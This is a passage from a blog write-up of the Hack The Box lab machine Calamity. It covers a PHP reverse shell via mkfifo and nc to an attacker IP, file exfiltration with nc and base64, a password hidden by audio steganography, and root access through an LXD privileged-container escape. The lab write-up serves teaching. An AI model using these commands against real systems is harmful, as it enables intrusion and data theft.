+<li><code>&lt;?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|/dev/shm/harmless 10.10.15.130 1234 &gt;/tmp/f') ?&gt;</code> tries again to get a shell with the copied version of nc (don&rsquo;t forget your local nc listener)</li>
+</ol>
+
+<p>Now we get a shell which is not detected.
+Running <code>id</code>, we find we are now <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code>.</p>
+
+<h1 id="audio-steganography">Audio steganography</h1>
+
+<p>Further inspecting the home folder, we find several interesting WAV files.
+To find out more about them, we have to copy them over to our own machine.
+This is done quickly with our harmless nc binary.</p>
+
+<p>For example, this is how to copy the file <code>/home/xalvas/recov.wav</code>:</p>
+
+<ul>
+<li>locally, run <code>nc -lnvp 1235 | base64 -d &gt; recov.wav</code></li>
+<li>remotely, run <code>base64 recov.wav | /dev/shm/harmless -w 3 10.10.15.130 1235</code></li>
+</ul>
+
+<p>It&rsquo;s best to pipe the files through base64 as otherwise the files can easily get corrupted.
+Calculate MD5 sums on both machines to make 100% sure it worked correctly.
+The following MD5 sums are correct:</p>
+
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-bash" data-lang="bash"><span></span>root@kali ~/calamity/files $ md5sum *
+a2c5f6ad4eee01f856348ec1e2972768  recov.wav
+a69077504fc70a0bd5a0e9ed4982a6b7  rick.wav
+553da35f2ea5e410f48762d6347ea5b8  xouzouris.mp3
+</code></pre></div>
+
+
+<p>If you listen to the 3 files, you notice two of them sound as if they are the same.
+The MD5 sums though demonstrate they are different.</p>
+
+<p>A popular steganograph trick is to apply small, unnoticably changes to media files that only make sense when comparing the result to the original file.
+With WAV files, it can be done as follows.
+You record a secret piece of audio that is relatively silent compared to another audio cover file, then add your secret file to the cover file.
+To recover the secret file, compare the result to the original cover.
+If you invert either of the files and add them, you get back the secret audio.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/0_htb_calamity/audacity.jpg"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Load both wav files into audacity, invert one, then export the combination of both (result on right side).</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+
+<p>Having that done, we can listen to a voice reading out numbers.
+It starts with a few things, followed by a long period of silence, and then part two.
+This leaves us with two options for the password:</p>
+
+<ul>
+<li>as read out by the voice: <code>???</code></li>
+<li>2nd part first, then 1st part: <code>18547936..*</code></li>
+</ul>
+
+<p>We can try both passwords on SSH for both the <code>root</code> and <code>xalvas</code> user.
+The combination <code>xalvas</code> and <code>18547936..*</code> works and we get in.</p>
+
+<h1 id="privesc-with-lxd-lxc">Privesc with LXD/LXC</h1>
+
+<p>With SSH access, we can do some basic enumeration for the user and the system.
+Doing so, we stumble upon a pretty simple and likely unintended privesc.
+The actual, intended way would be by exploiting a vulnarable binary located at <code>/home/xalvas/app/goodluck</code>.
+It it pretty tough though and I only describe the easy LXD-based way here.
+Check out the links at the bottom for other write-ups which contain walkthroughs for the buffer overflow.</p>
+
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-bash" data-lang="bash"><span></span>xalvas@calamity:~$ id
+<span style="color: #f8f8f2">uid</span><span style="color: #f92672">=</span>1000<span style="color: #f92672">(</span>xalvas<span style="color: #f92672">)</span> <span style="color: #f8f8f2">gid</span><span style="color: #f92672">=</span>1000<span style="color: #f92672">(</span>xalvas<span style="color: #f92672">)</span> <span style="color: #f8f8f2">groups</span><span style="color: #f92672">=</span>1000<span style="color: #f92672">(</span>xalvas<span style="color: #f92672">)</span>,4<span style="color: #f92672">(</span>adm<span style="color: #f92672">)</span>,24<span style="color: #f92672">(</span>cdrom<span style="color: #f92672">)</span>,30<span style="color: #f92672">(</span>dip<span style="color: #f92672">)</span>,46<span style="color: #f92672">(</span>plugdev<span style="color: #f92672">)</span>,110<span style="color: #f92672">(</span>lxd<span style="color: #f92672">)</span>,115<span style="color: #f92672">(</span>lpadmin<span style="color: #f92672">)</span>,116<span style="color: #f92672">(</span>sambashare<span style="color: #f92672">)</span>
+xalvas@calamity:~$ uname -a
+Linux calamity 4.4.0-81-generic <span style="color: #75715e">#104-Ubuntu SMP Wed Jun 14 08:15:00 UTC 2017 i686 i686 i686 GNU/Linux</span>
+</code></pre></div>
+
+
+<p>We notice xalvas is member of the lxd group.
+Like with most container technologies (e.g.,), you can run processes with root priviledges via LXD.
+Thus, being member of groups like lxd are more or less equivalent to being root.
+<a href="https://reboare.github.io/lxd/lxd-escape.html">Here</a> is a blog post with some details on how to exploit this group membership.</p>
+
+<p>The privesc requires to run a container with elevated priviledges and mount the host filesystem inside.
+Running containers requires an image on the machine.
+Since we do not have an internet connection on the machine, we have to copy over an image.
+The outline is as follows</p>
+
+<ol>
+<li>Build an image locally and copy image to remote host</li>
+<li>Import image into LXD, create a container and mount host filesystem</li>
+<li>Run a shell inside the container and get flag</li>
+</ol>
+
+<h2 id="prepare-image">Prepare image</h2>
+
+<p>Alpine is a popular Linux distribution to base container images on since it is so small.
+Unlike other operating systems, which may result in a few hundred megs, Alpine images are often rather small.
+In this <a href="https://github.com/saghul/lxd-alpine-builder">repository</a> you can find a simple script to build a container.
+Clone it, cd into it, then run <code>./build-alpine -a i686</code> and a tar file <code>alpine-v3.7-i686-20180121_1729.tar.gz</code> will appear.</p>
+
+<p>With SSH access, copying is as easy as running <code>scp alpine-v3.7-i686-20180121_1729.tar.gz xalvas@10.10.10.27:/dev/shm/.tmp/alpine.tar.gz</code>.</p>
+
+<h2 id="prepare-container">Prepare container</h2>
+
+<p>Importing tar files as images is explained <a href="https://stgraber.org/2016/03/30/lxd-2-0-image-management-512/">here</a>.
+The steps are as follows:</p>
+
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-bash" data-lang="bash"><span></span>xalvas@calamity:/dev/shm/.tmp$ lxc image import ./alpine.tar.gz --alias myimage
+Generating a client certificate. This may take a minute...
+If this is your first <span style="color: #f8f8f2">time</span> using LXD, you should also run: sudo lxd init
+To start your first container, try: lxc launch ubuntu:16.04
+
+Image imported with fingerprint: facaf59235080f8c950f700f1c0a9e65a7487901dfc30d04bd78bba7444df4b0
+xalvas@calamity:/dev/shm/.tmp$ lxc image list
++---------+--------------+--------+------------------------------+------+--------+------------------------------+
+<span style="color: #f8f8f2">|</span>  ALIAS  <span style="color: #f8f8f2">|</span> FINGERPRINT  <span style="color: #f8f8f2">|</span> PUBLIC <span style="color: #f8f8f2">|</span>         DESCRIPTION          <span style="color: #f8f8f2">|</span> ARCH <span style="color: #f8f8f2">|</span>  SIZE  <span style="color: #f8f8f2">|</span>         UPLOAD DATE          <span style="color: #f8f8f2">|</span>
++---------+--------------+--------+------------------------------+------+--------+------------------------------+
+<span style="color: #f8f8f2">|</span> myimage <span style="color: #f8f8f2">|</span> facaf5923508 <span style="color: #f8f8f2">|</span> no     <span style="color: #f8f8f2">|</span> alpine v3.7 <span style="color: #f92672">(</span>20180121_17:29<span style="color: #f92672">)</span> <span style="color: #f8f8f2">|</span> i686 <span style="color: #f8f8f2">|</span> 2.37MB <span style="color: #f8f8f2">|</span> Jan 21, <span style="color: #ae81ff">2018</span> at 8:06pm <span style="color: #f92672">(</span>UTC<span style="color: #f92672">)</span> <span style="color: #f8f8f2">|</span>
++---------+--------------+--------+------------------------------+------+--------+------------------------------+
+</code></pre></div>
+
+
+<p>The output above asks us to run <code>lxd init</code> but if we try, it tells us we should sudo, which we can&rsquo;t do.
+Fortunately, it will work without, so it&rsquo;s ok to ignore.</p>
+
+<p>We proceed by creating the container.
+The important part about it is using the flag <code>security.privileged=true</code>, which causes the container to interact as root with the host filesystem.
+This means all we have to do it mount the whole filesystem into the container and we get access to everything.</p>
+
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-bash" data-lang="bash"><span></span>xalvas@calamity:/dev/shm/.tmp$ lxc init myimage mycontainer -c security.privileged<span style="color: #f92672">=</span><span style="color: #f8f8f2">true</span>
+Creating mycontainer
+xalvas@calamity:/dev/shm/.tml$ lxc config device add mycontainer mydevice disk <span style="color: #f8f8f2">source</span><span style="color: #f92672">=</span>/ <span style="color: #f8f8f2">path</span><span style="color: #f92672">=</span>/mnt/root <span style="color: #f8f8f2">recursive</span><span style="color: #f92672">=</span><span style="color: #f8f8f2">true</span>
+Device mydevice added to mycontainer
+xalvas@calamity:/dev/shm/.tmp$ lxc list
++-------------+---------+------+------+------------+-----------+
+<span style="color: #f8f8f2">|</span>    NAME     <span style="color: #f8f8f2">|</span>  STATE  <span style="color: #f8f8f2">|</span> IPV4 <span style="color: #f8f8f2">|</span> IPV6 <span style="color: #f8f8f2">|</span>    TYPE    <span style="color: #f8f8f2">|</span> SNAPSHOTS <span style="color: #f8f8f2">|</span>
++-------------+---------+------+------+------------+-----------+
+<span style="color: #f8f8f2">|</span> mycontainer <span style="color: #f8f8f2">|</span> STOPPED <span style="color: #f8f8f2">|</span>      <span style="color: #f8f8f2">|</span>      <span style="color: #f8f8f2">|</span> PERSISTENT <span style="color: #f8f8f2">|</span> <span style="color: #ae81ff">0</span>         <span style="color: #f8f8f2">|</span>
++-------------+---------+------+------+------------+-----------+
+</code></pre></div>
+
+
+<h2 id="run-shell">Run shell</h2>
+
+<p>The last part is starting the container and executing a shell inside.
+We can then change into the rooted host filesystem and cat out the flag.</p>
+
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-bash" data-lang="bash"><span></span>xalvas@calamity:/dev/shm/.tmp$ lxc start mycontainer
+xalvas@calamity:/dev/shm/.tmp$ lxc <span style="color: #f8f8f2">exec</span> mycontainer /bin/sh
+~ <span style="color: #75715e"># id</span>
+<span style="color: #f8f8f2">uid</span><span style="color: #f92672">=</span>0<span style="color: #f92672">(</span>root<span style="color: #f92672">)</span> <span style="color: #f8f8f2">gid</span><span style="color: #f92672">=</span>0<span style="color: #f92672">(</span>root<span style="color: #f92672">)</span>
+~ <span style="color: #75715e"># ls -la /mnt/root/</span>
+total 108
+drwxr-xr-x   <span style="color: #ae81ff">22</span> root     root          <span style="color: #ae81ff">4096</span> Jun <span style="color: #ae81ff">29</span>  <span style="color: #ae81ff">2017</span> .
+drwxr-xr-x    <span style="color: #ae81ff">3</span> root     root          <span style="color: #ae81ff">4096</span> Jan <span style="color: #ae81ff">23</span> 20:20 ..
+drwxr-xr-x    <span style="color: #ae81ff">2</span> root     root          <span style="color: #ae81ff">4096</span> Jun <span style="color: #ae81ff">28</span>  <span style="color: #ae81ff">2017</span> bin
+drwxr-xr-x    <span style="color: #ae81ff">3</span> root     root          <span style="color: #ae81ff">4096</span> Jun <span style="color: #ae81ff">27</span>  <span style="color: #ae81ff">2017</span> boot
+drwxr-xr-x   <span style="color: #ae81ff">18</span> root     root          <span style="color: #ae81ff">3880</span> Jan <span style="color: #ae81ff">21</span> 22:26 dev
+drwxr-xr-x   <span style="color: #ae81ff">96</span> root     root          <span style="color: #ae81ff">4096</span> Jun <span style="color: #ae81ff">28</span>  <span style="color: #ae81ff">2017</span> etc
+<span style="color: #f92672">[</span>...<span style="color: #f92672">]</span>
+~ <span style="color: #75715e"># cat /mnt/root/root/root.txt</span>
+9be6... &lt;- flag
+</code></pre></div>
+
+
+<h1 id="buffer-overflow">Buffer overflow</h1>
+
+<p>If you are a container expert, chances are you would have taken another much harder path.
+A simple search for SUID binaries deliveres the following result:</p>
+
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-bash" data-lang="bash"><span></span>xalvas@calamity:~$ find / -perm -4000 2&gt;/dev/null
+/home/xalvas/app/goodluck
+/bin/ping6
+/bin/umount
+/bin/mount
+<span style="color: #f92672">[</span>...<span style="color: #f92672">]</span>
+</code></pre></div>
+
+
+<p>A file called <code>goodluck</code> sounds like you are supposed to explpoit it.
+And indeed, it is possible.</p>
+
+<h1 id="links">Links</h1>
+
+<p>If you are interesting in other tools or, in particular, in the buffer overflow, check out <a href="https://blog.mallardlabs.com/hackthebox-calamity-writeup/">this</a> or <a href="https://forum.hackthebox.eu/discussion/comment/3107/">this</a> for two excelent walkthroughs.
+you should definitly watch <a href="https://www.youtube.com/watch?v=EloOaaGg3nA&amp;t=">this</a> video by Ippsec, who has great tutorials on all the retired machines.</p>
+
+    </div>
+    
+    <footer>
+      <hr>
+      <p>
+  Published
+  
+    
+      by <span itemprop="author">Dominic Breuker</span>
+    
+  
+  <time itemprop="datePublished" datetime="2018-01-26T00:00:00&#43;01:00">
+    26 Jan, 2018
+  </time>
+  
+    in <span itemprop="articleSection"><a href="/categories/hackthebox/">hackthebox</a></span>
+  
+  
+    and tagged <a href="/tags/ctf/">ctf</a>, <a href="/tags/hackthebox/">hackthebox</a>, <a href="/tags/infosec/">infosec</a> and <a href="/tags/write-up/">write-up</a>
+  
+  using <span itemprop="wordCount">1952</span> words.
+</p>
+
+      
+
+
+
+    </footer>
+  </article>
+</main>
+    <footer>
+  
+
+</footer>
+  </body>
+</html>
